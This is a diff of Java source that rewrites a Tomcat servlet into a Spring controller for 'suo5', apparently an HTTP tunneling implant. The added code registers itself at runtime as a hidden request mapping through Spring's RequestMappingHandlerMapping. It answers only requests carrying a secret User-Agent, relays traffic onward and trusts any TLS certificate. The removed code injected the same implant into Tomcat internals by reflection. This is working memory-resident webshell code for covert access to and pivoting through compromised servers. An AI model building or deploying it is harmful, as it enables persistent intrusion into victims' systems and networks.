@@ -1,32 +1,29 @@
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.context.support.WebApplicationContextUtils;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import org.springframework.web.util.pattern.PathPatternParser;
+
 import java.io.*;
-import java.lang.reflect.Array;
-import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.*;
 import java.nio.ByteBuffer;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
-import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.HashMap;
 import javax.net.ssl.*;
-import javax.servlet.Servlet;
-import javax.servlet.ServletConfig;
-import javax.servlet.ServletContext;
-import javax.servlet.ServletException;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.jsp.PageContext;
 
-public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
-
+@RestController
+public class Suo5SpringController extends ClassLoader implements Runnable, HostnameVerifier, X509TrustManager {
     private HashMap parameterMap;
-    private ServletContext servletContext;
-    private ServletConfig servletConfig;
-    private String servletPath;
-    private String userAgent;
+    private String urlPattern;
+    private static String userAgent;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -34,16 +31,72 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     InputStream gInStream;
     OutputStream gOutStream;
 
-    public Suo5TomcatServlet() {
+
+    public Suo5SpringController() {
     }
 
-    public Suo5TomcatServlet(ClassLoader c) {
-        super(c);
+    public Suo5SpringController(ClassLoader loader) {
+        super(loader);
     }
 
-    public Suo5TomcatServlet(InputStream in, OutputStream out) {
+    public Suo5SpringController(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
+    }
+
+    public String getp(String key) {
+        try {
+            return new String((byte[]) this.parameterMap.get(key));
+        } catch (Exception var3) {
+            return null;
+        }
+    }
+
+    public boolean equals(Object obj) {
+        try {
+            this.parameterMap = (HashMap) obj;
+            this.urlPattern = getp("urlPattern");
+            this.userAgent = getp("userAgent");
+            return true;
+        } catch (Exception var3) {
+            return false;
+        }
+    }
+
+    public String toString() {
+        this.parameterMap.put("result", this.addController(new Suo5SpringController()).getBytes());
+        this.parameterMap = null;
+        return "";
+    }
+
+    public void test() throws Exception {
+        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
+        HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getResponse();
+        String agent = request.getHeader("User-Agent");
+        String contentType = request.getHeader("Content-Type");
+
+        if (agent == null || !agent.equals(this.userAgent)) {
+            return;
+        }
+        if (contentType == null) {
+            return;
+        }
+
+        try {
+            if (contentType.equals("application/plain")) {
+                tryFullDuplex(request, response);
+                return;
+            }
+
+            if (contentType.equals("application/octet-stream")) {
+                processDataBio(request, response);
+            } else {
+                processDataUnary(request, response);
+            }
+        } catch (Throwable e) {
+//                System.out.printf("process data error %s\n", e);
+//                e.printStackTrace();
+        }
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
@@ -251,7 +304,7 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
 
         Thread t = null;
         try {
-            Suo5TomcatServlet p = new Suo5TomcatServlet(scInStream, respOutStream);
+           Suo5SpringController p = new Suo5SpringController(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
             readReq(reqInputStream, scOutStream);
@@ -523,238 +576,26 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
         return new X509Certificate[0];
     }
 
-
-
-
-    public boolean equals(Object obj) {
+    protected String addController(Object springController) {
         try {
-            this.parameterMap = (HashMap)obj;
-            this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
-            this.servletPath = getp("servletPath");
-            this.userAgent = getp("userAgent");
-            return true;
-        } catch (Exception var3) {
-            return false;
+            // 获取 WebApplicationContext
+            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext());
+
+            // 获取 RequestMappingHandlerMapping
+            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+
+            // 实例化 handler, 获取 method, 构造 RequestMappingInfo
+            Method method = springController.getClass().getDeclaredMethod("test");
+            RequestMappingInfo.BuilderConfiguration options = new RequestMappingInfo.BuilderConfiguration();
+            options.setPatternParser(new PathPatternParser());
+            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(this.urlPattern).options(options).build();
+
+            // 注册 Controller
+            requestMappingHandlerMapping.registerMapping(requestMappingInfo, springController, method);
+
+        } catch (Exception e) {
+            return "failed";
         }
-    }
-
-    public String toString() {
-        this.parameterMap.put("result", this.addServlet().getBytes());
-        this.parameterMap = null;
-        return "";
-    }
-
-    private String addServlet() {
-        try {
-            String wrapperName = this.servletPath;
-            Object o = getFieldValue(this.servletContext, "context");
-            Object standardContext = getFieldValue(o, "context");
-            Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[])null);
-            this.invoke(newWrapper, "setName", wrapperName);
-            setFieldValue(newWrapper, "instance", this);
-            Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
-            Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
-            if (oldWrapper != null) {
-                standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
-            }
-
-            standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
-
-            Method method;
-            try {
-                method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
-            } catch (Exception var9) {
-                method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
-            }
-
-            method.invoke(standardContext, this.servletPath, wrapperName);
-            if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
-                this.transform(standardContext, this.servletPath);
-                this.init((ServletConfig)getFieldValue(newWrapper, "facade"));
-            }
-
-            return "ok";
-        } catch (Exception var10) {
-            return var10.getMessage();
-        }
-    }
-
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
-        Field f = null;
-        if (obj instanceof Field) {
-            f = (Field)obj;
-        } else {
-            f = obj.getClass().getDeclaredField(fieldName);
-        }
-
-        f.setAccessible(true);
-        f.set(obj, value);
-    }
-
-    private void transform(Object standardContext, String path) throws Exception {
-        Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
-        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
-        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
-        listenersField.setAccessible(true);
-        ArrayList listeners = (ArrayList)listenersField.get(containerBase);
-
-        for(int i = 0; i < listeners.size(); ++i) {
-            Object mapperListener_Mapper = listeners.get(i);
-            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
-                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
-                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");
-
-                for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
-                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
-                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
-                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");
-
-                    for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
-                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
-                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
-                            new ArrayList();
-                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
-                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
-                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
-                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");
-
-                            int l;
-                            Object Mapper_Wrapper;
-                            Method addWrapperMethod;
-                            for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
-                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
-                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
-                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
-                                    addWrapperMethod.setAccessible(true);
-                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
-                                }
-                            }
-
-                            for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
-                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
-                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
-                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
-                                    addWrapperMethod.setAccessible(true);
-                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-    }
-
-    private Object invoke(Object obj, String methodName, Object... parameters) {
-        try {
-            ArrayList classes = new ArrayList();
-            if (parameters != null) {
-                for(int i = 0; i < parameters.length; ++i) {
-                    Object o1 = parameters[i];
-                    if (o1 != null) {
-                        classes.add(o1.getClass());
-                    } else {
-                        classes.add((Object)null);
-                    }
-                }
-            }
-
-            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
-            return method.invoke(obj, parameters);
-        } catch (Exception var7) {
-            return null;
-        }
-    }
-
-    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
-        Method method = null;
-
-        while(cs != null) {
-            try {
-                method = cs.getDeclaredMethod(methodName, parameters);
-                cs = null;
-            } catch (Exception var6) {
-                cs = cs.getSuperclass();
-            }
-        }
-
-        return method;
-    }
-
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field f = null;
-        if (obj instanceof Field) {
-            f = (Field)obj;
-        } else {
-            Method method = null;
-            Class cs = obj.getClass();
-
-            while(cs != null) {
-                try {
-                    f = cs.getDeclaredField(fieldName);
-                    cs = null;
-                } catch (Exception var6) {
-                    cs = cs.getSuperclass();
-                }
-            }
-        }
-
-        f.setAccessible(true);
-        return f.get(obj);
-    }
-
-    public void init(ServletConfig paramServletConfig) throws ServletException {
-        this.servletConfig = paramServletConfig;
-    }
-
-    public ServletConfig getServletConfig() {
-        return this.servletConfig;
-    }
-
-    public void service(ServletRequest paramServletRequest, ServletResponse paramServletResponse) throws ServletException, IOException {
-        HttpServletRequest request = (HttpServletRequest) paramServletRequest;
-        HttpServletResponse response = (HttpServletResponse) paramServletResponse;
-        String agent = request.getHeader("User-Agent");
-        String contentType = request.getHeader("Content-Type");
-
-        if (agent == null || !agent.equals(this.userAgent)) {
-            return;
-        }
-        if (contentType == null) {
-            return;
-        }
-
-        try {
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response);
-                return;
-            }
-
-            if (contentType.equals("application/octet-stream")) {
-                processDataBio(request, response);
-            } else {
-                processDataUnary(request, response);
-            }
-        } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
-        }
-
-    }
-
-    public String getServletInfo() {
-        return "";
-    }
-
-    public void destroy() {
-    }
-
-    public String getp(String key) {
-        try {
-            return new String((byte[])this.parameterMap.get(key));
-        } catch (Exception var3) {
-            return null;
-        }
+        return "ok";
     }
 }
